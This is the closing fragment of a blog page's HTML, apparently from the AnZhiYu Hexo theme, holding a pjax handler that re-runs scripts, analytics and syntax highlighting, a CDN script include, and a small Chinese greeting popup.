+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
